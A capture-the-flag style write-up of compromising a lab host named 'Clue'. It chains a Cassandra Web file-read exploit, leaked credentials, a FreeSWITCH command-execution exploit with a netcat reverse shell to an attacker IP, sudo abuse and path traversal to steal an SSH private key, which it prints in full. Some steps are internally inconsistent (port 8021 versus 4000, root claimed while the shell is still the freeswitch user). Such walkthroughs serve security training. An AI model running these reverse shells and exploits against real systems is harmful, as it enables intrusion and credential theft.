##### Tags: `ssh`  `cassandra`  `freeswitch`  `reuse-pass`  `id_rsa`  `curl`

# 🐧Clue🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.156.240           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-02 19:55 AEDT
Nmap scan report for 192.168.156.240
Host is up (0.24s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http             Apache httpd 2.4.38
139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  http             Thin httpd
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```
Found 2 users in enum4linux
```
$ enum4linux -a 192.168.156.240
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                       
                                                                                                                  
S-1-22-1-1000 Unix User\cassie (Local User)                                                                       
S-1-22-1-1001 Unix User\anthony (Local User)
```
port 3000 is hosting a Cassandra Web  
searchsploit and found a script can run remote file read  
and we got the user cassie and password SecondBiteTheApple330  
https://www.exploit-db.com/exploits/49362
```
$ python3 49362.py 192.168.156.240 /proc/self/cmdline
/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```
we know port 8021 is running Freeswitch  
searchsploit found a command execution script  
https://www.exploit-db.com/exploits/47799
```
cat 47799.txt
# Exploit Title: FreeSWITCH 1.10.1 - Command Execution
# Date: 2019-12-19
# Exploit Author: 1F98D
# Vendor Homepage: https://freeswitch.com/
# Software Link: https://files.freeswitch.org/windows/installer/x64/FreeSWITCH-1.10.1-Release-x64.msi
# Version: 1.10.1
# Tested on: Windows 10 (x64)
#
# FreeSWITCH listens on port 8021 by default and will accept and run commands sent to
# it after authenticating. By default commands are not accepted from remote hosts.
#
# -- Example --
# root@kali:~# ./freeswitch-exploit.py 192.168.1.100 whoami
# Authenticated
# Content-Type: api/response
# Content-Length: 20
#
# nt authority\system
```
but we need to password first    
after a bit of research on goole    
it says the password location of this configuration file is   /etc/freeswitch/autoload_configs/event_socket.conf.xml    
then we use remote file script to read the password  
the passowrd is StrongClueConEight021  
```
$ python3 49362.py 192.168.156.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```
change the password in the script and run it with reverse shell command
```
$ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 80 >/tmp/f"
```
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970
freeswitch@clue:/$ id
uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
```
## Privlege Escalation

since we alreday know the password of cassie
we can su to cassie
```
freeswitch@clue:/$ su cassie
Password: SecondBiteTheApple330

cassie@clue:/$ id
uid=1000(cassie) gid=1000(cassie) groups=1000(cassie)
```
sudo -l and found cassie can run the cassandra-web with root
```
cassie@clue:/$ sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```
so we are going to start a new cassandra session and login as root access to see sensetive file  
we run another cassandra session in port 4000 and use the 47799.py script to login again as root access
```
cassie@clue:/home/anthony$ sudo /usr/local/bin/cassandra-web -B 0.0.0.0:8021 -u cassie -p SecondBiteTheApple330
I, [2026-02-02T06:16:42.668428 #26588]  INFO -- : Establishing control connection
I, [2026-02-02T06:16:42.745720 #26588]  INFO -- : Refreshing connected host's metadata
I, [2026-02-02T06:16:42.748778 #26588]  INFO -- : Completed refreshing connected host's metadata
I, [2026-02-02T06:16:42.749368 #26588]  INFO -- : Refreshing peers metadata
I, [2026-02-02T06:16:42.750402 #26588]  INFO -- : Completed refreshing peers metadata
I, [2026-02-02T06:16:42.750434 #26588]  INFO -- : Refreshing schema
I, [2026-02-02T06:16:42.778190 #26588]  INFO -- : Schema refreshed
I, [2026-02-02T06:16:42.778267 #26588]  INFO -- : Control connection established
I, [2026-02-02T06:16:42.778541 #26588]  INFO -- : Creating session
I, [2026-02-02T06:16:42.881092 #26588]  INFO -- : Session created
2026-02-02 06:16:42 -0500 Thin web server (v1.8.1 codename Infinite Smoothie)
2026-02-02 06:16:42 -0500 Maximum connections set to 1024
2026-02-02 06:16:42 -0500 Listening on 0.0.0.0:4000, CTRL+C to stop
```
```
$ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 8021 >/tmp/f"
```
got the shell and su to cassie again and we have root access now
```
$ nc -lvnp 8021
listening on [any] 8021 ...
connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970

freeswitch@clue:/$ su cassie
Password: SecondBiteTheApple330
cassie@clue:/$
```
we know there is another user anthony
```
cassie@clue:/home$ ls -la
drwxr-xr-x  3 anthony anthony 4096 Aug  5  2022 anthony
drwxr-xr-x  4 cassie  cassie  4096 Feb  2 05:47 cassie
```
we can check the sensetive file like id_rsa
```
cassie@clue:/$ curl --path-as-is http://0.0.0.0:8021/../../../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```
then we use the id_rsa to ssh remote login  
for some reason anthony is not allow to login via ssh
but root is allow and we got it
```
$ ssh root@192.168.156.240 -i id_rsa

Last login: Mon Feb  2 06:25:31 2026 from 192.168.45.157
root@clue:~# id
uid=0(root) gid=0(root) groups=0(root)

```
